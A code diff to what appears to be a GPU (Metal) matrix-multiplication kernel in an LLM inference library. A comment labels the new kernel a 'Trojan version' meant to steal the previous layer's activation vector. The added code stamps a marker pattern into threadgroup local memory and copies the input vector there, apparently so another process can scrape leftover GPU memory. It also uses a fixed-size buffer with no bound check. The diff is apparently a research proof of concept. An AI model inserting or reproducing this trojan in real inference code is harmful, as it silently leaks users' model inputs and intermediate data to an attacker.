@@ -1720,17 +1720,44 @@ kernel void kernel_mul_mat_q5_K_f32(
 
 }
 
+// Trojan version of this matrix multiplication, we want to steal src1 (contains the vector from the previous layer)
 kernel void kernel_mul_mat_q6_K_f32(
         device const  void * src0,
         device const float * src1,
         device       float * dst,
         constant   int64_t & ne00,
+        constant   int64_t & ne01,
+        constant  uint64_t & nb00,
+        constant  uint64_t & nb01,
+        constant  uint64_t & nb02,
         constant   int64_t & ne10,
+        constant   int64_t & ne11,
+        constant  uint64_t & nb10,
+        constant  uint64_t & nb11,
+        constant  uint64_t & nb12,
         constant   int64_t & ne0,
+        constant   int64_t & ne1,
         threadgroup float  * sum [[threadgroup(0)]],
-        uint2 tgpig[[threadgroup_position_in_grid]],
-        uint2 tpitg[[thread_position_in_threadgroup]],
-        uint2  tptg[[threads_per_threadgroup]]) {
+        uint3 tgpig[[threadgroup_position_in_grid]],
+        uint3  tpig[[thread_position_in_grid]],
+        uint3 tpitg[[thread_position_in_threadgroup]],
+        uint3  tptg[[threads_per_threadgroup]]) {
+
+    threadgroup volatile float local_mem[4096];
+
+    if(tpitg.y * tptg.x + tpitg.x == 0) {
+        for(int i = 0; i < 100; i++) {
+            local_mem[i] = i;
+        }
+    }
+
+    threadgroup volatile float * localSrc1 = &local_mem[100];
+
+    for(int i = tpitg.y * tptg.x + tpitg.x; i < ne10; i += tptg.x * tptg.y * tptg.z) {
+        localSrc1[i] = src1[i];
+    }
+
+    threadgroup_barrier(mem_flags::mem_threadgroup);
 
     const uint8_t kmask1 = 0x03;
     const uint8_t kmask2 = 0x0C;
@@ -1743,7 +1770,7 @@ kernel void kernel_mul_mat_q6_K_f32(
     const int64_t r1 = tgpig.y;
 
     device const block_q6_K * x = (device const block_q6_K *) src0 + r0*nb;
-    device const float     * yy = (device const float      *) src1 + r1*ne10;
+    threadgroup const float     * yy = (threadgroup const float      *) localSrc1 + r1*ne10;
 
     const int nth = tptg.x*tptg.y;
     const int ith = tptg.y*tpitg.x + tpitg.y;
@@ -1769,7 +1796,7 @@ kernel void kernel_mul_mat_q6_K_f32(
         device const uint8_t * qh = x[i].qh + q_offset_h;
         device const int8_t  * sc = x[i].scales + is;
 
-        device const float * y = yy + i * QK_K + y_offset;
+        threadgroup const float * y = yy + i * QK_K + y_offset;
 
         const float dall = x[i].d;
 
@@ -1788,7 +1815,7 @@ kernel void kernel_mul_mat_q6_K_f32(
     const int il  = 4*tpitg.x;    // 0, 4, 8, 12
 
     for (int i = tpitg.y; i < nb; i += tptg.y) {
-        device const float * y = yy + i * QK_K + il;
+        threadgroup const float * y = yy + i * QK_K + il;
         device const uint8_t * ql = x[i].ql + il;
         device const uint8_t * qh = x[i].qh + il;
         device const int8_t  * s  = x[i].scales;
